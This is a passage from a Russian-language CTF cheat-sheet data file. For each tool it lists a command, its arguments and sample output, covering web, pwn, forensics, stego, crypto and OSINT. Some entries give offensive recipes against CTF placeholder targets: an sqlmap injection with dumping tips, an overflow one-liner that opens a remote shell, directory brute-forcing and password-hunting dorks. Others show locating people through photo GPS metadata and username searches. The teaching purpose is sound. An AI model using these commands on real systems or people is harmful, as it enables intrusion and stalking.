      tool: "sherlock",
      description: "Ищет аккаунты с указанным именем (никнеймом) на сотнях популярных сайтов и форумов.",
      command: "python3 sherlock.py [никнейм]",
      frequency: "high",
      explanation: [
        { arg: "python3 sherlock.py", desc: "Запуск скрипта Sherlock." },
        { arg: "[никнейм]", desc: "Имя пользователя (username), профили которого нужно найти." }
      ],
      output: `user@ctf-box:~$ python3 sherlock.py ctf_master\n[+] GitHub: https://github.com/ctf_master\n[+] Reddit: https://www.reddit.com/user/ctf_master`,
      important: [
        { token: "[+]", desc: "Плюс в квадратных скобках указывает на успешно найденный живой профиль на данном ресурсе." }
      ]
    },
    {
      id: "osi-exiftool",
      categoryId: "osint",
      tool: "exiftool",
      description: "Считывает метаданные из графических файлов, документов и аудио. Помогает узнать дату съемки, тип камеры или GPS-координаты.",
      command: "exiftool [путь_к_изображению.jpg]",
      frequency: "high",
      explanation: [
        { arg: "exiftool", desc: "Программа для чтения, записи и редактирования метаинформации." },
        { arg: "[путь_к_изображению.jpg]", desc: "Изображение или документ (pdf, docx, png) для анализа." }
      ],
      output: `user@ctf-box:~$ exiftool photo.jpg\nCamera Model Name               : iPhone 14 Pro\nDate/Time Original              : 2026:05:12 11:24:45\nGPS Position                    : 55 deg 45' 6.20" N, 37 deg 37' 4.10" E`,
      important: [
        { token: "GPS Position", desc: "Координаты места съемки в метаданных изображения. Вставив их в карты (Google Maps), можно вычислить точное местоположение." },
        { token: "Date/Time Original", desc: "Реальное время и дата съемки кадра. Полезно для восстановления цепочки событий." }
      ]
    },

    // === WEB ===
    {
      id: "web-curl",
      categoryId: "web",
      tool: "curl",
      description: "Утилита командной строки для передачи данных с сервера или на сервер по HTTP/HTTPS. Позволяет настраивать заголовки, куки и типы запросов.",
      command: "curl -i -X POST -H \"[заголовок]: [значение]\" -d \"[данные_запроса]\" [url_адрес]",
      frequency: "high",
      explanation: [
        { arg: "curl", desc: "Утилита отправки сетевых запросов." },
        { arg: "-i", desc: "Выводить заголовки HTTP-ответа сервера вместе с телом страницы." },
        { arg: "-X POST", desc: "Использовать метод POST вместо стандартного GET." },
        { arg: "-H \"[заголовок]: [значение]\"", desc: "Кастомный HTTP-заголовок (например, `User-Agent: Admin` или `Cookie: session=123`)." },
        { arg: "-d \"[данные_запроса]\"", desc: "Отправить данные в теле POST-запроса (например, `username=admin&password=123`)." },
        { arg: "[url_адрес]", desc: "Адрес веб-ресурса (например, `http://challenge.ctf/login`)." }
      ],
      output: `user@ctf-box:~$ curl -i -X POST -H "Cookie: user=admin" -d "check=flag" http://target.ctf/api\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\n\n{"status":"success","flag":"flag{curl_h77p_p0st_m4st3r}"}`,
      important: [
        { token: "HTTP/1.1 200 OK", desc: "HTTP-статус успешного выполнения запроса. Если код 403 (Forbidden) или 500 (Internal Error), проверьте правильность заголовков и куки." },
        { token: "\"flag\": \"flag{...}\"", desc: "Тело ответа сервера (в данном случае JSON). Здесь содержится искомый флаг." }
      ]
    },
    {
      id: "web-sqlmap",
      categoryId: "web",
      tool: "sqlmap",
      description: "Мощный инструмент для автоматического поиска и эксплуатации уязвимостей SQL-инъекций в базах данных.",
      command: "sqlmap -u \"[url_с_параметром]\" --dbs --batch",
      frequency: "high",
      explanation: [
        { arg: "sqlmap", desc: "Инструмент автоматизации SQL-инъекций." },
        { arg: "-u \"[url_с_параметром]\"", desc: "Указать тестируемый URL-адрес. Обязательно должен содержать тестируемый параметр (например, `http://site.com/news.php?id=5`)." },
        { arg: "--dbs", desc: "Команда: получить список доступных баз данных (Databases) при успешной инъекции." },
        { arg: "--batch", desc: "Работать в автоматическом режиме: автоматически выбирать ответы по умолчанию на все вопросы утилиты." }
      ],
      output: `user@ctf-box:~$ sqlmap -u "http://target.ctf/page.php?id=1" --dbs --batch\n[+] Target is vulnerable to Boolean-based blind SQL injection\navailable databases [3]:\n(*) target_db\n(*) security_logs`,
      important: [
        { token: "Target is vulnerable", desc: "Подтверждение от утилиты, что параметр подвержен SQL-инъекции. С этого момента можно дампить данные." },
        { token: "available databases", desc: "Список баз данных, к которым получен доступ. Для извлечения таблиц из нужной БД запустите команду с флагом `-D target_db --tables`." }
      ]
    },
    {
      id: "web-gobuster",
      categoryId: "web",
      tool: "gobuster",
      description: "Быстро перебирает скрытые директории и файлы на веб-сайте, используя список слов.",
      command: "gobuster dir -u [url_сайта] -w [путь_к_словарю] -x [расширения]",
      frequency: "high",
      explanation: [
        { arg: "gobuster", desc: "Утилита сканирования структуры каталогов." },
        { arg: "dir", desc: "Режим перебора каталогов и файлов (directory brute-forcing)." },
        { arg: "-u [url_сайта]", desc: "Базовый URL сайта (например, `http://10.10.10.12/`)." },
        { arg: "-w [путь_к_словарю]", desc: "Путь к словарю путей (например, `/usr/share/wordlists/dirb/common.txt`)." },
        { arg: "-x [расширения]", desc: "Искать файлы с конкретными расширениями через запятую (например, `php,html,txt`)." }
      ],
      output: `user@ctf-box:~$ gobuster dir -u http://10.10.10.12/ -w common.txt -x php\n/index.php           (Status: 200) [Size: 3422]\n/admin.php           (Status: 302) [Size: 120] -> Redirecting\n/config.php          (Status: 200) [Size: 0]`,
      important: [
        { token: "Status: 200", desc: "Код успешного ответа HTTP. Файл существует и доступен без авторизации (например, `/config.php` может содержать учетные данные БД)." },
        { token: "Status: 302", desc: "Перенаправление. Страница существует, но вас переадресует на другую (например, на страницу логина)." }
      ]
    },

    // === PWN ===
    {
      id: "pwn-pwntools",
      categoryId: "pwn",
      tool: "pwntools",
      description: "Библиотека на Python для разработки эксплоитов. Пример Python-однострочника, создающего подключение и отправляющего данные переполнения.",
      command: "python3 -c 'from pwn import *; r = remote(\"[хост]\", [порт]); r.sendline(b\"A\"*100); r.interactive()'",
      frequency: "high",
      explanation: [
        { arg: "from pwn import *", desc: "Импортировать все функции библиотеки pwntools." },
        { arg: "r = remote(\"[хост]\", [порт])", desc: "Установить сетевое TCP-соединение с CTF-сервером (например, `remote('10.10.10.10', 1337)`)." },
        { arg: "r.sendline(b\"A\"*100)", desc: "Отправить строку из 100 байт 'A' (мусор для переполнения буфера) с переносом строки." },
        { arg: "r.interactive()", desc: "Переключить терминал в интерактивный режим взаимодействия (чтобы можно было выполнять команды в открывшемся шелле)." }
      ],
      output: `user@ctf-box:~$ python3 -c 'from pwn import *; r = remote("10.10.10.10", 1337); r.sendline(b"A"*100); r.interactive()'\n[+] Opening connection to 10.10.10.10 on port 1337: Done\n[*] Switching to interactive mode\n$ id\nuid=1000(ctf_user) gid=1000(ctf_user)\n$ cat flag.txt\nflag{pwntools_buffer_overflow_success}`,
      important: [
        { token: "Switching to interactive mode", desc: "Сетевое соединение перешло в режим консоли. Эксплоит сработал, вы перегрузили буфер и получили шелл." },
        { token: "flag{...}", desc: "Содержимое прочитанного флага из файла flag.txt на удаленном сервере." }
      ]
    },
    {
      id: "pwn-ropgadget",
      categoryId: "pwn",
      tool: "ROPgadget",
      description: "Помогает найти ассемберные инструкции (гаджеты) в бинарнике для сборки ROP-цепочки и обхода защиты стека NX.",
      command: "ROPgadget --binary [путь_к_файлу] --only \"[типы_команд]\"",
      frequency: "high",
      explanation: [
        { arg: "ROPgadget", desc: "Утилита поиска ROP-инструкций." },
        { arg: "--binary [путь_к_файлу]", desc: "Исполняемый файл для поиска гаджетов." },
        { arg: "--only \"[типы_команд]\"", desc: "Показывать только конкретные ассемблерные команды (например, `--only \"pop|ret\"`)." }
      ],
      output: `user@ctf-box:~$ ROPgadget --binary ./task --only "pop|ret"\nGadgets information\n============================================================\n0x0000000000400773 : pop rdi ; ret\n0x0000000000400771 : pop rsi ; pop r15 ; ret\n\nUnique gadgets found: 2`,
      important: [
        { token: "pop rdi ; ret", desc: "Крайне важный гаджет для x64-систем. Регистр RDI отвечает за первый аргумент функции. Нужен, чтобы передать адрес строки `/bin/sh` в функцию `system()`." }
      ]
    },
    {
      id: "pwn-cyclic",
      categoryId: "pwn",
      tool: "cyclic",
      description: "Генерирует неповторяющуюся строку для быстрого определения точного размера буфера (смещения) при переполнении в отладчике.",
      command: "cyclic [размер]",
      frequency: "high",
      explanation: [
        { arg: "cyclic", desc: "Команда генерации циклического паттерна Де Брёйна." },
        { arg: "[размер]", desc: "Длина строки в байтах, которую нужно сгенерировать (например, `150`)." }
      ],
      output: `user@ctf-box:~$ cyclic 24\naaaabaaacaaadaaaeaaafaaa`,
      important: [
        { token: "aaaabaaa...", desc: "Сгенерированная последовательность. Если программа падает по неверному адресу (например, `0x61616167`), с помощью `cyclic -l 0x61616167` вы узнаете точное смещение до EIP/RIP." }
      ]
    },

    // === FORENSICS ===
    {
      id: "for-volatility",
      categoryId: "forensics",
      tool: "volatility 3",
      description: "Фреймворк для исследования дампов оперативной памяти (RAM). Позволяет вытащить список запущенных процессов, историю командной строки и сетевые соединения.",
      command: "python3 vol.py -f [дамп_памяти.raw] [плагин]",
      frequency: "high",
      explanation: [
        { arg: "python3 vol.py", desc: "Запуск фреймворка Volatility 3." },
        { arg: "-f [дамп_памяти.raw]", desc: "Путь к файлу дампа оперативной памяти компьютера." },
        { arg: "[плагин]", desc: "Модуль анализа. Например: `windows.pslist.PsList` (список процессов), `windows.cmdline.CmdLine` (команды консоли), `linux.lsof.Lsof` (открытые файлы)." }
      ],
      output: `user@ctf-box:~$ python3 vol.py -f memory.raw windows.pslist.PsList\nPID     PPID    ImageFileName   Offset(V)       Threads\n512     484     explorer.exe    0xe000021b4a0   42\n2024    512     cmd.exe         0xe00003b5110   1`,
      important: [
        { token: "PID", desc: "Process Identifier. Уникальный номер процесса в системе." },
        { token: "cmd.exe", desc: "Запущенный интерпретатор командной строки Windows. Указывает, что пользователь работал в консоли, стоит проверить историю ввода плагином `windows.cmdline.CmdLine`." }
      ]
    },
    {
      id: "for-binwalk",
      categoryId: "forensics",
      tool: "binwalk",
      description: "Анализирует бинарные файлы на наличие внедренных файлов других типов (архивов, картинок, документов). Автоматически извлекает их.",
      command: "binwalk -e [путь_к_файлу]",
      frequency: "high",
      explanation: [
        { arg: "binwalk", desc: "Инструмент сигнатурного анализа бинарных файлов." },
        { arg: "-e", desc: "Флаг extract — автоматически распаковывать и извлекать все найденные файлы во вложенную папку." },
        { arg: "[путь_к_файлу]", desc: "Анализируемый файл (например, прошивка роутера или картинка с подозрением на стеганографию)." }
      ],
      output: `user@ctf-box:~$ binwalk -e stego.png\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 800 x 600, 8-bit/color RGBA\n41202         0xA0F2          Zip archive data, name: secret_flag.txt`,
      important: [
        { token: "Zip archive data", desc: "Найденный скрытый архив внутри картинки PNG. Он будет извлечен в отдельную директорию `_stego.png.extracted`." }
      ]
    },
    {
      id: "for-foremost",
      categoryId: "forensics",
      tool: "foremost",
      description: "Восстанавливает файлы (JPG, PDF, ZIP и др.) из образов дисков или дампов памяти на основе их сигнатур (заголовков).",
      command: "foremost -i [дамп_диска.dd] -o [папка_вывода]",
      frequency: "high",
      explanation: [
        { arg: "foremost", desc: "Консольная утилита восстановления файлов." },
        { arg: "-i [дамп_диска.dd]", desc: "Входной образ накопителя или поврежденный файл (input)." },
        { arg: "-o [папка_вывода]", desc: "Директория, куда сложить все успешно восстановленные файлы (output)." }
      ],
      output: `user@ctf-box:~$ foremost -i disk.img -o output_dir\n2 jpeg files recovered (64 KB)\n1 zip files recovered (12 KB)`,
      important: [
        { token: "zip files recovered", desc: "Указывает, что утилита смогла обнаружить заголовок ZIP-архива и вырезала его из сырого образа, восстановив работоспособность файла." }
      ]
    },
    {
      id: "for-tshark",
      categoryId: "forensics",
      tool: "tshark (Wireshark CLI)",
      description: "Утилита анализа пакетов сетевого трафика. Позволяет фильтровать pcap-файлы без запуска тяжелого графического интерфейса Wireshark.",
      command: "tshark -r [трафик.pcap] -Y \"[фильтр]\"",
      frequency: "high",
      explanation: [
        { arg: "tshark", desc: "Сетевой анализатор командной строки." },
        { arg: "-r [трафик.pcap]", desc: "Файл захваченного сетевого трафика (read)." },
        { arg: "-Y \"[фильтр]\"", desc: "Синтаксис дисплейных фильтров Wireshark (например, `-Y \"http.request.method == POST\"` или `-Y \"dns\"`)." }
      ],
      output: `user@ctf-box:~$ tshark -r web_traffic.pcap -Y "http.request.method == POST" -T fields -e http.file_data\nusername=admin&password=flag{pcap_tshark_post_request_extract}`,
      important: [
        { token: "password=flag{...}", desc: "Полезная нагрузка HTTP POST запроса. Мы отфильтровали отправку форм на сервер и перехватили переданные учетные данные." }
      ]
    },

    // === STEGANOGRAPHY ===
    {
      id: "steg-steghide",
      categoryId: "stego",
      tool: "steghide",
      description: "Извлекает скрытые файлы из изображений (JPG, BMP) и аудиофайлов (WAV, AU). Часто защищается паролем.",
      command: "steghide extract -sf [картинка.jpg] -p \"[пароль]\"",
      frequency: "high",
      explanation: [
        { arg: "steghide extract", desc: "Запуск утилиты в режиме извлечения данных." },
        { arg: "-sf [картинка.jpg]", desc: "Путь к файлу-контейнеру (stego file), содержащему скрытое послание." },
        { arg: "-p \"[пароль]\"", desc: "Пароль для расшифровки. Если пароля нет, укажите пустые кавычки `\"\"`." }
      ],
      output: `user@ctf-box:~$ steghide extract -sf cool_image.jpg -p "123456"\nwrote extracted data to "hidden_flag.txt".`,
      important: [
        { token: "wrote extracted data to", desc: "Успешное извлечение. Скрытые данные были успешно записаны в указанный текстовый файл (в примере: hidden_flag.txt)." }
      ]
    },
    {
      id: "steg-zsteg",
      categoryId: "stego",
      tool: "zsteg",
      description: "Скрипт для поиска скрытых данных в наименее значащих битах (LSB) изображений форматов PNG и BMP.",
      command: "zsteg -a [картинка.png]",
      frequency: "high",
      explanation: [
        { arg: "zsteg", desc: "Утилита LSB-стеганографии." },
        { arg: "-a", desc: "Запустить все доступные методы анализа и перебора каналов (all)." },
        { arg: "[картинка.png]", desc: "Путь к исследуемому изображению." }
      ],
      output: `user@ctf-box:~$ zsteg -a secret.png\nimagedata           .. text: "flag{zsteg_lsb_extracted_912}"\nb1,rgb,lsb,xy       .. text: "super_secret_password"`,
      important: [
        { token: "text: \"flag{...}\"", desc: "Успешно обнаруженный текст. zsteg автоматически перебирает битовые плоскости и выводит любые осмысленные ASCII-строки." }
      ]
    },
    {
      id: "steg-pngcheck",
      categoryId: "stego",
      tool: "pngcheck",
      description: "Анализирует структуру PNG файла. Помогает найти скрытые чанки данных, аномальные размеры или поврежденные контрольные суммы CRC.",
      command: "pngcheck -vtp [картинка.png]",
      frequency: "medium",
      explanation: [
        { arg: "pngcheck", desc: "Инструмент валидации PNG файлов." },
        { arg: "-v", desc: "Подробный вывод (verbose) структуры чанков." },
        { arg: "-t", desc: "Показывать текстовое содержимое чанков (например, комментарии)." },
        { arg: "-p", desc: "Выводить содержимое некоторых других чанков (например, палитру PLTE)." },
        { arg: "[картинка.png]", desc: "Путь к исследуемой картинке." }
      ],
      output: `user@ctf-box:~$ pngcheck -vtp image.png\n  chunk tEXt at offset 0x00025, length 24: keyword = Description, text = flag{hidden_text_in_chunk}\nNo errors detected in image.png.`,
      important: [
        { token: "chunk tEXt", desc: "Текстовый блок метаданных PNG. Сюда часто записывают скрытые комментарии с подсказками или флагами." }
      ]
    },

    // === MISC ===
    {
      id: "misc-nc",
      categoryId: "misc",
      tool: "nc (Netcat)",
      description: "Утилита для чтения и записи данных в сетевых соединениях с использованием протоколов TCP и UDP. Позволяет подключаться к удаленным шеллам или запускать слушатель.",
      command: "nc [хост] [порт]",
      frequency: "high",
      explanation: [
        { arg: "nc", desc: "Вызов Netcat (сетевого швейцарского ножа)." },
        { arg: "[хост]", desc: "Сетевой адрес сервера (домен или IP), например `10.10.10.15`." },
        { arg: "[порт]", desc: "Номер порта, на котором висит задание, например `1337`." }
      ],
      output: `user@ctf-box:~$ nc 10.10.10.15 1337\n== Welcome to PWN Challenge ==\nEnter your payload:\nadmin\nAccess Granted. Here is your flag:\nflag{netcat_connects_us_all}`,
      important: [
        { token: "flag{...}", desc: "Вывод флага после успешного сетевого взаимодействия с сервером CTF." }
      ]
    },
    {
      id: "misc-grep",
      categoryId: "misc",
      tool: "grep",
      description: "Рекурсивный поиск текста по регулярным выражениям внутри файлов в текущей папке. Полезно для быстрого нахождения флагов.",
      command: "grep -rnw '[путь_к_папке]' -e 'flag{'",
      frequency: "high",
      explanation: [
        { arg: "grep", desc: "Утилита поиска текстовых совпадений." },
        { arg: "-r", desc: "Рекурсивный поиск (заходить во все вложенные папки)." },
        { arg: "-n", desc: "Выводить номера строк, в которых найдено совпадение." },
        { arg: "-w", desc: "Искать слово целиком (избегает совпадения части слов)." },
        { arg: "'[путь_к_папке]'", desc: "Каталог, внутри которого искать файлы (например, текущая папка `./`)." },
        { arg: "-e 'flag{'", desc: "Шаблон (регулярное выражение) для поиска." }
      ],
      output: `user@ctf-box:~$ grep -rnw './' -e 'flag{'\n./scripts/config.py:12:   KEY = 'flag{grep_found_it_in_code}'`,
      important: [
        { token: "./scripts/config.py:12", desc: "Путь к файлу и номер строки (12), в которой обнаружен искомый шаблон флага." }
      ]
    },

    // === REVERSE (дополнительные) ===
    {
      id: "rev-nm",
      categoryId: "reverse",
      tool: "nm",
      description: "Выводит таблицу символов из объектного или исполняемого файла: имена функций, глобальных переменных и их адреса. Работает только если файл не stripped.",
      command: "nm -D [путь_к_файлу] | grep -i 'check\\|flag\\|pass\\|verify'",
      frequency: "medium",
      explanation: [
        { arg: "nm", desc: "Утилита вывода таблицы символов бинарного файла." },
        { arg: "-D", desc: "Показывать только динамические символы (те, что экспортируются через динамическую библиотеку)." },
        { arg: "| grep -i 'check|flag|pass|verify'", desc: "Фильтровать вывод по ключевым словам — ищем функции, связанные с проверкой пароля или флага." }
      ],
      output: `user@ctf-box:~$ nm -D ./task | grep -i 'check\\|flag'\n0000000000001170 T check_flag\n0000000000004020 D secret_flag_buffer`,
      important: [
        { token: "T check_flag", desc: "Буква T означает, что символ находится в секции .text (код). Это имя функции — отличная зацепка для анализа в GDB или Ghidra." },
        { token: "D secret_flag_buffer", desc: "Буква D — секция инициализированных данных. Возможно, здесь хранится строка флага или ключ." }
      ]
    },
    {
      id: "rev-xxd",
      categoryId: "reverse",
      tool: "xxd",
      description: "Создаёт hex-дамп файла с ASCII-представлением справа. Позволяет найти магические байты, заголовки форматов и скрытые строки в бинарных файлах.",
      command: "xxd [файл] | grep -A 2 -B 2 '[паттерн]'",
      frequency: "high",
      explanation: [
        { arg: "xxd", desc: "Создать шестнадцатеричный дамп файла." },
        { arg: "[файл]", desc: "Путь к бинарному файлу для анализа." },
        { arg: "| grep -A 2 -B 2", desc: "Вывести 2 строки до и после найденного совпадения для контекста." },
        { arg: "'[паттерн]'", desc: "Искомый ASCII-паттерн, например `flag` или `PK` (заголовок ZIP)." }
      ],
      output: `user@ctf-box:~$ xxd secret.bin | grep -A 2 'flag'\n00000050: 666c 6167 7b68 6578 5f64 756d 705f 7365  flag{hex_dump_se\n00000060: 6372 6574 5f31 3333 377d 0a00 0000 0000  cret_1337}......`,
      important: [
        { token: "666c6167", desc: "Hex-кодировка слова 'flag' (f=66, l=6c, a=61, g=67). Искать эту последовательность байт — быстрый способ найти флаг в бинарнике." }
      ]
    },
    {
      id: "rev-upx",
      categoryId: "reverse",
      tool: "upx",
      description: "Распаковывает исполняемые файлы, сжатые упаковщиком UPX. Многие CTF-бинарники упакованы UPX — распаковка обязательна перед анализом в Ghidra/IDA.",
      command: "upx -d [упакованный_файл] -o [распакованный_файл]",
      frequency: "medium",
      explanation: [
        { arg: "upx", desc: "Ultimate Packer for eXecutables — утилита упаковки/распаковки бинарников." },
        { arg: "-d", desc: "Режим декомпрессии (decompress/unpack)." },
        { arg: "[упакованный_файл]", desc: "Исходный упакованный файл." },
        { arg: "-o [распакованный_файл]", desc: "Имя выходного файла после распаковки." }
      ],
      output: `user@ctf-box:~$ upx -d packed_task -o task_unpacked\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2024\nFile size         Ratio      Format      Name\n--------------------   ------   -----------   -----------\n    87040 <-    32768   37.64%   linux/amd64   task_unpacked\nUnpacked 1 file.`,
      important: [
        { token: "Unpacked 1 file", desc: "Успешная распаковка. Теперь файл готов к декомпиляции в Ghidra или анализу в GDB — до этого все функции были замаскированы." }
      ]
    },
    {
      id: "rev-angr",
      categoryId: "reverse",
      tool: "angr",
      description: "Фреймворк символьного выполнения на Python. Автоматически находит входные данные, при которых программа достигает нужной точки (например, выводит флаг).",
      command: "python3 -c \"import angr; p = angr.Project('[файл]'); sm = p.factory.simulation_manager(); sm.explore(find=[адрес_успеха]); print(sm.found[0].posix.dumps(0))\"",
      frequency: "low",
      explanation: [
        { arg: "angr.Project('[файл]')", desc: "Загрузить бинарный файл в angr для анализа." },
        { arg: "sm.explore(find=[адрес])", desc: "Запустить поиск: angr будет символически выполнять программу, пока не найдёт путь до указанного адреса." },
        { arg: "sm.found[0].posix.dumps(0)", desc: "Вывести stdin-ввод, который привёл к достижению цели — это и есть ответ/пароль/флаг." }
      ],
      output: `user@ctf-box:~$ python3 solve.py\nWARNING | ... | loaded object has no PT_GNU_STACK\nb'flag{angr_symex_autosolved_42}'`,
      important: [
        { token: "posix.dumps(0)", desc: "Дамп stdin (файловый дескриптор 0). Это строка, которую нужно было ввести в программу — angr нашёл её автоматически без реверса вручную." }
      ]
    },

    // === CRYPTO (дополнительные) ===
    {
      id: "cry-base64",
      categoryId: "crypto",
      tool: "base64",
      description: "Кодирование и декодирование Base64. Один из самых распространённых способов «скрытия» данных в CTF — флаг часто просто закодирован в Base64.",
      command: "echo '[строка]' | base64 -d",
      frequency: "high",
      explanation: [
        { arg: "echo '[строка]'", desc: "Передать закодированную строку в конвейер." },
        { arg: "base64", desc: "Стандартная утилита кодирования Base64." },
        { arg: "-d", desc: "Режим декодирования (decode). Без флага — кодирование." }
      ],
      output: `user@ctf-box:~$ echo 'ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259' | base64 -d\nflag{base64_is_not_encryption}`,
      important: [
        { token: "flag{...}", desc: "Декодированный флаг. Base64 — это кодирование, не шифрование. Не требует ключа." }
      ]
    },
    {
      id: "cry-gpg",
      categoryId: "crypto",
      tool: "gpg",
      description: "Расшифровывает файлы, защищённые шифрованием PGP/GPG. В CTF часто встречаются задачи с зашифрованными GPG-файлами и прилагаемым приватным ключом.",
      command: "gpg --import [приватный_ключ.asc] && gpg --decrypt [зашифрованный_файл.gpg]",
      frequency: "medium",
      explanation: [
        { arg: "gpg --import", desc: "Импортировать приватный ключ в локальное хранилище GPG." },
        { arg: "[приватный_ключ.asc]", desc: "Файл приватного ключа (обычно с расширением .asc или .key)." },
        { arg: "--decrypt", desc: "Расшифровать файл с помощью импортированного ключа." },
        { arg: "[зашифрованный_файл.gpg]", desc: "Зашифрованный файл (расширение .gpg или .pgp)." }
      ],
      output: `user@ctf-box:~$ gpg --import private.asc && gpg --decrypt message.gpg\ngpg: key 0xDEADBEEF: secret key imported\ngpg: encrypted with RSA key\nflag{gpg_private_key_decryption_ftw}`,
      important: [
        { token: "secret key imported", desc: "Ключ успешно импортирован. Теперь GPG может использовать его для расшифровки." }
      ]
    },
    {
      id: "cry-openssl-enc",
      categoryId: "crypto",
      tool: "openssl enc",
      description: "Расшифровывает данные, зашифрованные симметричным алгоритмом (AES-256-CBC, AES-128-ECB и др.) с известным паролем.",
      command: "openssl enc -d -aes-256-cbc -in [зашифрованный.enc] -out [вывод.txt] -k [пароль]",
      frequency: "medium",
      explanation: [
        { arg: "enc", desc: "Подкоманда симметричного шифрования/расшифрования." },
        { arg: "-d", desc: "Режим дешифрования (decrypt)." },
        { arg: "-aes-256-cbc", desc: "Алгоритм шифрования. Замените на нужный: `-aes-128-ecb`, `-des3`, `-rc4` и т.д." },
        { arg: "-in [файл]", desc: "Входной зашифрованный файл." },
        { arg: "-k [пароль]", desc: "Пароль для генерации ключа и IV. Если дан явный ключ HEX — используйте `-K [hex_key] -iv [hex_iv]`." }
      ],
      output: `user@ctf-box:~$ openssl enc -d -aes-256-cbc -in cipher.enc -out plain.txt -k "s3cr3t"\nuser@ctf-box:~$ cat plain.txt\nflag{openssl_aes_symmetric_crack}`,
      important: [
        { token: "-K / -iv", desc: "Если задан сырой HEX-ключ, используйте `-K [32 байта в hex]` и `-iv [16 байт в hex]` вместо `-k пароль`." }
      ]
    },
    {
      id: "cry-python-rot",
      categoryId: "crypto",
      tool: "python3 (ROT/Caesar)",
      description: "Быстрый Python-однострочник для перебора всех 25 вариантов шифра Цезаря или конкретного ROT-N сдвига.",
      command: "python3 -c \"s='[зашифрованный_текст]'; [print(f'ROT{i}:', ''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in s)) for i in range(26)]\"",
      frequency: "high",
      explanation: [
        { arg: "s='[текст]'", desc: "Зашифрованная строка для перебора." },
        { arg: "for i in range(26)", desc: "Перебрать все 26 возможных сдвигов алфавита." },
        { arg: "(ord(c)-65+i)%26+65", desc: "Формула сдвига для заглавных букв. Аналогично для строчных (база 97)." }
      ],
      output: `user@ctf-box:~$ python3 -c "s='synt{ebg13_vf_rnfl}'; ..."\nROT0: synt{ebg13_vf_rnfl}\nROT13: flag{rot13_is_easy}`,
      important: [
        { token: "ROT13", desc: "Самый частый вариант в CTF. Сдвиг на 13 позиций — единственный симметричный шифр Цезаря (ROT13(ROT13(x)) = x)." }
      ]
    },
    {
      id: "cry-python-xor",
      categoryId: "crypto",
      tool: "python3 (XOR bruteforce)",
      description: "Перебор однобайтового XOR-ключа. Если данные зашифрованы XOR с одним байтом — этот скрипт найдёт ключ за секунду.",
      command: "python3 -c \"d=open('[файл.bin]','rb').read(); [print(f'key={k:#04x}:', bytes(b^k for b in d)) for k in range(256) if b'flag' in bytes(b^k for b in d)]\"",
      frequency: "high",
      explanation: [
        { arg: "open('[файл]','rb').read()", desc: "Прочитать зашифрованный файл как байты." },
        { arg: "for k in range(256)", desc: "Перебрать все 256 возможных значений однобайтового ключа." },
        { arg: "if b'flag' in ...", desc: "Выводить только те варианты, где результат содержит слово 'flag'." }
      ],
      output: `user@ctf-box:~$ python3 -c "..."\nkey=0x42: b'flag{single_byte_xor_cracked_42}'`,
      important: [
        { token: "key=0x42", desc: "Найденный ключ XOR в hex. Число 0x42 = 66 десятичное = символ 'B' в ASCII." }
      ]
    },

    // === OSINT (дополнительные) ===
    {
      id: "osi-dig",
      categoryId: "osint",
      tool: "dig",
      description: "Расширенный инструмент DNS-запросов. Поддерживает все типы записей, показывает raw-ответ от DNS-сервера и время запроса.",
      command: "dig [домен] [тип_записи] +noall +answer",
      frequency: "high",
      explanation: [
        { arg: "dig", desc: "DNS lookup утилита (Domain Information Groper)." },
        { arg: "[домен]", desc: "Целевое доменное имя." },
        { arg: "[тип_записи]", desc: "Тип DNS-записи: A, AAAA, MX, TXT, CNAME, NS, ANY." },
        { arg: "+noall +answer", desc: "Показывать только секцию ответа, без дополнительного шума." }
      ],
      output: `user@ctf-box:~$ dig secret.ctf.org TXT +noall +answer\nsecret.ctf.org.  300  IN  TXT  "flag{dig_dns_enumeration_done}"`,
      important: [
        { token: "IN TXT", desc: "DNS TXT-запись. Часто используется в CTF для хранения флагов, так как допускает произвольный текст." }
      ]
    },
    {
      id: "osi-subfinder",
      categoryId: "osint",
      tool: "subfinder",
      description: "Быстрый пассивный перечислитель поддоменов. Использует открытые базы данных (crt.sh, VirusTotal и др.) без активного сканирования цели.",
      command: "subfinder -d [домен] -silent | sort -u",
      frequency: "medium",
      explanation: [
        { arg: "subfinder", desc: "Инструмент пассивного обнаружения поддоменов." },
        { arg: "-d [домен]", desc: "Основной домен для поиска субдоменов." },
        { arg: "-silent", desc: "Подавить баннеры — выводить только найденные поддомены." },
        { arg: "| sort -u", desc: "Отсортировать и убрать дубликаты." }
      ],
      output: `user@ctf-box:~$ subfinder -d target.ctf -silent | sort -u\nadmin.target.ctf\napi.target.ctf\ndev.target.ctf\nhidden-flag.target.ctf`,
      important: [
        { token: "hidden-flag.target.ctf", desc: "Скрытый поддомен — частая находка в CTF-заданиях по OSINT. Стоит проверить каждый найденный субдомен." }
      ]
    },
    {
      id: "osi-curl-wayback",
      categoryId: "osint",
      tool: "curl (Wayback CDX API)",
      description: "Поиск всех сохранённых снимков сайта в Wayback Machine через CDX-API. Позволяет найти удалённые страницы, старые версии файлов и скрытые URL.",
      command: "curl 'http://web.archive.org/cdx/search/cdx?url=[домен]/*&output=text&fl=original&collapse=urlkey' | sort -u",
      frequency: "medium",
      explanation: [
        { arg: "web.archive.org/cdx/search/cdx", desc: "CDX-API Wayback Machine для программного поиска по индексу." },
        { arg: "url=[домен]/*", desc: "Шаблон поиска: все URL под этим доменом." },
        { arg: "fl=original", desc: "Выводить только оригинальные URL (без временных меток)." },
        { arg: "collapse=urlkey", desc: "Убрать дубликаты одного и того же URL." }
      ],
      output: `user@ctf-box:~$ curl 'http://web.archive.org/cdx/...' | head -5\nhttps://target.ctf/admin/backup.zip\nhttps://target.ctf/secret/flag_2022.txt\nhttps://target.ctf/index.php`,
      important: [
        { token: "backup.zip / flag_2022.txt", desc: "Удалённые файлы, которые были проиндексированы Wayback Machine. Можно скачать через `web.archive.org/web/[timestamp]/[url]`." }
      ]
    },
    {
      id: "osi-google-dorks",
      categoryId: "osint",
      tool: "Google Dorks",
      description: "Продвинутые операторы поиска Google для нахождения скрытой информации: открытые файлы, панели администрирования, логи, конфиги с паролями.",
      command: "site:[домен] filetype:[расширение] intitle:[заголовок] inurl:[путь]",
      frequency: "high",
      explanation: [
        { arg: "site:[домен]", desc: "Ограничить поиск конкретным сайтом." },
